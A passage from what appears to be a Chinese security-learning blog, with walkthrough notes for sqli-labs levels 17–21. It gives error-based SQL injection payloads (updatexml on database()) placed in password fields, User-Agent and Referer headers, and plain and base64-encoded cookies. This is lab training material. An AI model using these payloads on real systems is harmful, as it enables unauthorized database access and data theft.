+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">各种符号或存在的用户名+符号</span><br></pre></td></tr></table></figure>
+<p><strong>结果：发现有做防护，只有在username完全是存在的用户名时才不会报错</strong></p>
+<p><img src="Untitled%2037.png" alt="Untitled"></p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dumb</span><br></pre></td></tr></table></figure>
+<p><strong>结果：username无注入点，接下来测试password</strong></p>
+<p><img src="Untitled%2038.png" alt="Untitled"></p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:dumb</span><br><span class="line">new password:<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：无回显，但是存在报错，可以使用报错注入</strong></p>
+<p><img src="Untitled%2039.png" alt="Untitled"></p>
+<h3 id="爆破数据库-1"><a href="#爆破数据库-1" class="headerlink" title="爆破数据库"></a>爆破数据库</h3><p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:dumb</span><br><span class="line">new password:<span class="string">&#x27;and updatexml(1,concat(0x7e,database()),1) #</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：得到数据库名称，后面步骤重复，不再演示，第十七关结束</strong></p>
+<p><img src="Untitled%2040.png" alt="Untitled"></p>
+<h2 id="Less-18：POST-Header-injection-Uagent-field-Error-based"><a href="#Less-18：POST-Header-injection-Uagent-field-Error-based" class="headerlink" title="Less-18：POST -Header injection -Uagent field - Error based"></a>Less-18：POST -Header injection -Uagent field - Error based</h2><p><img src="Untitled%2041.png" alt="Untitled"></p>
+<h3 id="判断注入点-8"><a href="#判断注入点-8" class="headerlink" title="判断注入点"></a>判断注入点</h3><p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在username和password中各种测试</span><br></pre></td></tr></table></figure>
+<p><strong>结果：除了正常登陆外，没有发现别的异常</strong></p>
+<p><img src="Untitled%2042.png" alt="Untitled"></p>
+<p><strong>payload</strong></p>
+<p>我们选择一个正常的账户进行登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">admin</span><br></pre></td></tr></table></figure>
+<p><strong>结果：有回显，内容其实是请求头中的内容user-agent，抓包</strong></p>
+<p><img src="Untitled%2043.png" alt="Untitled"></p>
+<p><strong>抓包放到重放器中</strong></p>
+<p><img src="Untitled%2044.png" alt="Untitled"></p>
+<p>在重放器中找到我们的user-agent来判断是否存在注入点</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0)<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：报错，可以使用报错注入</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near <span class="string">&#x27;Gecko/20100101Firefox/127 0&#x27;</span>,<span class="string">&#x27;127.0 0 1&#x27;</span>,<span class="string">&#x27;admin  at line 1</span></span><br></pre></td></tr></table></figure>
+<p><img src="Untitled%2045.png" alt="Untitled"></p>
+<h3 id="爆破数据库名-5"><a href="#爆破数据库名-5" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h3><p><strong>payload：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: <span class="string">&#x27; or updatexml(1,concat(0x7e,(select database())),1),1) #</span></span><br></pre></td></tr></table></figure>
+<p><strong>分析：</strong></p>
+<p>因为根据报错信息可知，闭合方式为单引号和括号，但是因为这句并不是查询语句。所以并不能直接闭合然后在用and报错注入，先把单引号闭合然后 报错注入后再闭合括号</p>
+<p><strong>结果：得到数据库名，后续操作不再演示，第十八关结束</strong></p>
+<p><img src="Untitled%2046.png" alt="Untitled"></p>
+<h2 id="Less-19：POST-HeaderIniection-Referer-field-Error-based"><a href="#Less-19：POST-HeaderIniection-Referer-field-Error-based" class="headerlink" title="Less-19：POST-HeaderIniection-Referer field -Error based"></a>Less-19：POST-HeaderIniection-Referer field -Error based</h2><h3 id="界面-8"><a href="#界面-8" class="headerlink" title="界面"></a>界面</h3><p><img src="Untitled%2047.png" alt="Untitled"></p>
+<h3 id="判断注入点-9"><a href="#判断注入点-9" class="headerlink" title="判断注入点"></a>判断注入点</h3><p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">先使用admin，admin或一个确定的账户登录，查看回显</span><br></pre></td></tr></table></figure>
+<p><strong>结果：回显refer，用老办法尝试username和password处并不存在注入点，因此抓包判断refer</strong></p>
+<p><img src="Untitled%2048.png" alt="Untitled"></p>
+<p><strong>抓包：依旧放到重放器中</strong></p>
+<p><img src="Untitled%2049.png" alt="Untitled"></p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: <span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：报错，发现闭合方式为单引号和括号，可以使用报错注入</strong></p>
+<p><img src="Untitled%2050.png" alt="Untitled"></p>
+<h3 id="爆破数据库名-6"><a href="#爆破数据库名-6" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h3><p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: <span class="string">&#x27;) or updatexml(1,concat(0x7e,database()),1)#</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：直接闭合单引号括号，报错猜测是插入语句</strong></p>
+<p><img src="Untitled%2051.png" alt="Untitled"></p>
+<p><strong>payload：验证一下是不是插入语句</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;) #</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：经典的插入语句报错</strong></p>
+<p><img src="Untitled%2052.png" alt="Untitled"></p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; or updatexml(1,concat(0x7e,database()),1))#</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：得到数据库名，后面不再演示，第十九关结束</strong></p>
+<p><img src="Untitled%2053.png" alt="Untitled"></p>
+<h2 id="Less-20：POST-Cookie-injections-Uagent-field-error-based"><a href="#Less-20：POST-Cookie-injections-Uagent-field-error-based" class="headerlink" title="Less-20：POST-Cookie injections -Uagent field -error based."></a>Less-20：POST-Cookie injections -Uagent field -error based.</h2><h3 id="界面-9"><a href="#界面-9" class="headerlink" title="界面"></a>界面</h3><p><img src="Untitled%2054.png" alt="Untitled"></p>
+<h3 id="判断注入点-10"><a href="#判断注入点-10" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>依旧在username和password中找不到注入点</p>
+<p>使用正确的账户进行登录admin，admin</p>
+<p><img src="Untitled%2055.png" alt="Untitled"></p>
+<p><strong>抓包并上传到重放器，抓登陆后的</strong></p>
+<p><img src="Untitled%2056.png" alt="Untitled"></p>
+<p>在username处进行尝试看看是否存在注入点</p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: <span class="built_in">uname</span>=<span class="string">&#x27; ;</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：根据报错信息可知其使用单引号闭合</strong></p>
+<p><img src="Untitled%2057.png" alt="Untitled"></p>
+<h3 id="爆破数据库名-7"><a href="#爆破数据库名-7" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h3><p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span>=<span class="string">&#x27; and updatexml(1,concat(0x7e,database()),1)#</span></span><br></pre></td></tr></table></figure>
+<p><strong>结果：得到数据库名，后面不再赘述，第二十关结束</strong></p>
+<p><img src="Untitled%2058.png" alt="Untitled"></p>
+<h2 id="Less-21：POST-Dump-into-outfile-string"><a href="#Less-21：POST-Dump-into-outfile-string" class="headerlink" title="Less-21：POST- Dump into outfile -string ."></a>Less-21：POST- Dump into outfile -string .</h2><h3 id="界面-10"><a href="#界面-10" class="headerlink" title="界面"></a>界面</h3><p><img src="Untitled%2059.png" alt="Untitled"></p>
+<h3 id="判断注入点-11"><a href="#判断注入点-11" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>使用正常用户登录admin，admin</p>
+<p><img src="Untitled%2060.png" alt="Untitled"></p>
+<p><strong>刷新，抓包，并发送到重放器</strong></p>
+<p><img src="Untitled%2061.png" alt="Untitled"></p>
+<p>发现Cookie中的uname使用的是BASE64加密很可疑，我们可以使用burp自带的解密进行查看，<strong>注意：其中%3D为URL编码，意思是=，防止base64解密出错，可以先URLdecode</strong></p>
+<p><img src="Untitled%2062.png" alt="Untitled"></p>
+<p>同时也可以利用自带的base64-encode进行加密，我们使用单引号然后base64加密进行构造payload看看是否存在注入点</p>
+<p><strong>payload：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: <span class="built_in">uname</span>=Jw==;</span><br></pre></td></tr></table></figure>
+<p><strong>结果：根据报错信息可知，闭合方式为单引号+括号（为什么三个单引号，因为我们前面没填东西，就把前面的一个单引号给爆出来了）</strong></p>
+<p><img src="Untitled%2063.png" alt="Untitled"></p>
+<p><strong>payload</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: <span class="built_in">uname</span>=JykgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLGRhdGFiYXNlKCkpLDEpIw== ;</span><br></pre></td></tr></table></figure>
+<p><strong>结果：得到数据库名称，后面不再赘述，第二十一关结束</strong></p>
+<p><img src="Untitled%2064.png" alt="Untitled"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Don Joshua</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/07/02/sql-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0(%E4%B8%8B)/">http://example.com/2024/07/02/sql-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0(%E4%B8%8B)/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Don_Joshua's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a></div><div class="post_share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/07/01/SYN%20Flood%E6%94%BB%E5%87%BB/" title="SYN Flood攻击"><div class="cover" style="background: transparent"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">SYN Flood攻击</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/07/01/sql-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0(%E4%B8%8A)/" title="sql-labs通关笔记(上)"><div class="cover" style="background: transparent"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-01</div><div class="title">sql-labs通关笔记(上)</div></div></a></div><div><a href="/2023/05/29/%E5%A2%A8%E8%80%85%E5%9C%A8%E7%BA%BF%E9%9D%B6%E5%9C%BA-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%8A%A0%E5%AF%86%E5%AE%9E%E8%AE%ADAES/" title="墨者在线靶场-SQL注入漏洞测试(参数加密)"><div class="cover" style="background: transparent"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-29</div><div class="title">墨者在线靶场-SQL注入漏洞测试(参数加密)</div></div></a></div><div><a href="/2023/04/15/%E7%9B%B2%E6%B3%A8%E5%BF%AB%E9%80%9F%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/" title="盲注快速获取数据"><div class="cover" style="background: transparent"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-15</div><div class="title">盲注快速获取数据</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Don Joshua</div><div class="author-info__description">Nothing is true,everything is permitted</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">36</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Jo4hua"><i class="fab fa-github"></i><span>关注我 不迷路</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:2947127811@qq.com" target="_blank" title="邮箱"><i class="iconfont icon-youjian"></i></a><a class="social-icon" href="tencent://message/?uin=2947127811&amp;Site=Sambow&amp;Menu=yes" target="_blank" title="QQ"><i class="iconfont icon-QQ"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客！ 立志成为一名网络安全人员 才疏学浅，文笔拙略 来这里一起见证我的成长吧！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sql-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8B"><span class="toc-number">1.</span> <span class="toc-text">sql-labs通关笔记(下)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-10%EF%BC%9AGET-Blind-Time-based-double-quotes"><span class="toc-number">1.1.</span> <span class="toc-text">Less-10：GET -Blind -Time based -double quotes</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%95%8C%E9%9D%A2"><span class="toc-number">1.1.1.</span> <span class="toc-text">界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">1.1.2.</span> <span class="toc-text">判断注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">1.1.3.</span> <span class="toc-text">爆破数据库名</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#POST%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">POST注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-11%EF%BC%9APOST-Error-Based-single-quotes-string"><span class="toc-number">2.1.</span> <span class="toc-text">Less-11：POST -Error Based -single quotes- string</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%95%8C%E9%9D%A2-1"><span class="toc-number">2.1.1.</span> <span class="toc-text">界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9-1"><span class="toc-number">2.1.2.</span> <span class="toc-text">判断注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="toc-number">2.1.3.</span> <span class="toc-text">判断字段数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E4%BD%8D"><span class="toc-number">2.1.4.</span> <span class="toc-text">判断回显位</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D-1"><span class="toc-number">2.1.5.</span> <span class="toc-text">爆破数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E8%A1%A8%E5%90%8D"><span class="toc-number">2.1.6.</span> <span class="toc-text">爆破表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-number">2.1.7.</span> <span class="toc-text">爆破字段名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E6%95%B0%E6%8D%AE"><span class="toc-number">2.1.8.</span> <span class="toc-text">爆破数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-12%EF%BC%9APOST-Error-Based-Double-quotes-String-with-twist"><span class="toc-number">2.2.</span> <span class="toc-text">Less-12：POST-Error Based-Double quotes-String -with twist</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%95%8C%E9%9D%A2-2"><span class="toc-number">2.2.1.</span> <span class="toc-text">界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9-2"><span class="toc-number">2.2.2.</span> <span class="toc-text">判断注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0-1"><span class="toc-number">2.2.3.</span> <span class="toc-text">判断字段数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E4%BD%8D%E7%BD%AE"><span class="toc-number">2.2.4.</span> <span class="toc-text">判断回显位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D-2"><span class="toc-number">2.2.5.</span> <span class="toc-text">爆破数据库名</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-13%EF%BC%9APosT-Double-Injection-Single-quotes-string-with-twist"><span class="toc-number">2.3.</span> <span class="toc-text">Less-13：PosT -Double Injection -Single quotes- string - with twist</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%95%8C%E9%9D%A2-3"><span class="toc-number">2.3.1.</span> <span class="toc-text">界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9-3"><span class="toc-number">2.3.2.</span> <span class="toc-text">判断注入点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-14%EF%BC%9APosT-Double-Injection-single-quotes-string-with-twist"><span class="toc-number">2.4.</span> <span class="toc-text">Less-14：PosT -Double Injection -single quotes- string -with twist</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%95%8C%E9%9D%A2-4"><span class="toc-number">2.4.1.</span> <span class="toc-text">界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9-4"><span class="toc-number">2.4.2.</span> <span class="toc-text">判断注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D-3"><span class="toc-number">2.4.3.</span> <span class="toc-text">爆破数据库名</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-15%EF%BC%9APosT-Blind-Boolian-time-Based-Single-quotes"><span class="toc-number">2.5.</span> <span class="toc-text">Less-15：PosT -Blind-Boolian&#x2F;time Based -Single quotes</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%95%8C%E9%9D%A2-5"><span class="toc-number">2.5.1.</span> <span class="toc-text">界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9-5"><span class="toc-number">2.5.2.</span> <span class="toc-text">判断注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">2.5.3.</span> <span class="toc-text">爆破数据库</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-16%EF%BC%9APosT-Blind-Boolian-Time-Based-Double-quotes"><span class="toc-number">2.6.</span> <span class="toc-text">Less-16：PosT -Blind-Boolian&#x2F;Time Based -Double quotes</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%95%8C%E9%9D%A2-6"><span class="toc-number">2.6.1.</span> <span class="toc-text">界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9-6"><span class="toc-number">2.6.2.</span> <span class="toc-text">判断注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D-4"><span class="toc-number">2.6.3.</span> <span class="toc-text">爆破数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8sqlmap%E8%BF%9B%E8%A1%8CPOST%E6%B3%A8%E5%85%A5"><span class="toc-number">2.6.4.</span> <span class="toc-text">使用sqlmap进行POST注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8sqlmap%E7%88%86%E7%A0%B4%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">2.6.5.</span> <span class="toc-text">使用sqlmap爆破数据库名</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-17%EF%BC%9APosT-Update-Query-Error-Based-string"><span class="toc-number">2.7.</span> <span class="toc-text">Less-17：PosT -Update Query- Error Based -string</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%95%8C%E9%9D%A2-7"><span class="toc-number">2.7.1.</span> <span class="toc-text">界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9-7"><span class="toc-number">2.7.2.</span> <span class="toc-text">判断注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E6%95%B0%E6%8D%AE%E5%BA%93-1"><span class="toc-number">2.7.3.</span> <span class="toc-text">爆破数据库</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-18%EF%BC%9APOST-Header-injection-Uagent-field-Error-based"><span class="toc-number">2.8.</span> <span class="toc-text">Less-18：POST -Header injection -Uagent field - Error based</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9-8"><span class="toc-number">2.8.1.</span> <span class="toc-text">判断注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D-5"><span class="toc-number">2.8.2.</span> <span class="toc-text">爆破数据库名</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-19%EF%BC%9APOST-HeaderIniection-Referer-field-Error-based"><span class="toc-number">2.9.</span> <span class="toc-text">Less-19：POST-HeaderIniection-Referer field -Error based</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%95%8C%E9%9D%A2-8"><span class="toc-number">2.9.1.</span> <span class="toc-text">界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9-9"><span class="toc-number">2.9.2.</span> <span class="toc-text">判断注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D-6"><span class="toc-number">2.9.3.</span> <span class="toc-text">爆破数据库名</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-20%EF%BC%9APOST-Cookie-injections-Uagent-field-error-based"><span class="toc-number">2.10.</span> <span class="toc-text">Less-20：POST-Cookie injections -Uagent field -error based.</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%95%8C%E9%9D%A2-9"><span class="toc-number">2.10.1.</span> <span class="toc-text">界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9-10"><span class="toc-number">2.10.2.</span> <span class="toc-text">判断注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D-7"><span class="toc-number">2.10.3.</span> <span class="toc-text">爆破数据库名</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-21%EF%BC%9APOST-Dump-into-outfile-string"><span class="toc-number">2.11.</span> <span class="toc-text">Less-21：POST- Dump into outfile -string .</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%95%8C%E9%9D%A2-10"><span class="toc-number">2.11.1.</span> <span class="toc-text">界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9-11"><span class="toc-number">2.11.2.</span> <span class="toc-text">判断注入点</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-calendar"><div class="card-content"><div class="item-headline"><i class="fas fa-calendar"></i><span>文章发布日历</span></div><div class="widget" id="calendar"></div></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/07/02/sql-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0(%E4%B8%8B)/" title="sql-labs通关笔记(下)">sql-labs通关笔记(下)</a><time datetime="2024-07-02T06:05:34.000Z" title="发表于 2024-07-02 14:05:34">2024-07-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/07/01/SYN%20Flood%E6%94%BB%E5%87%BB/" title="SYN Flood攻击">SYN Flood攻击</a><time datetime="2024-07-01T06:05:34.000Z" title="发表于 2024-07-01 14:05:34">2024-07-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/07/01/sql-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0(%E4%B8%8A)/" title="sql-labs通关笔记(上)">sql-labs通关笔记(上)</a><time datetime="2024-07-01T06:05:34.000Z" title="发表于 2024-07-01 14:05:34">2024-07-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/07/01/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8FHMS-1/" title="『vulnhub系列』HMS?-1">『vulnhub系列』HMS?-1</a><time datetime="2024-07-01T06:05:34.000Z" title="发表于 2024-07-01 14:05:34">2024-07-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/06/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8FHACKABLE-II/" title="『vulnhub系列』HACKABLE-II">『vulnhub系列』HACKABLE-II</a><time datetime="2024-06-06T07:17:48.000Z" title="发表于 2024-06-06 15:17:48">2024-06-06</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Don Joshua</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas 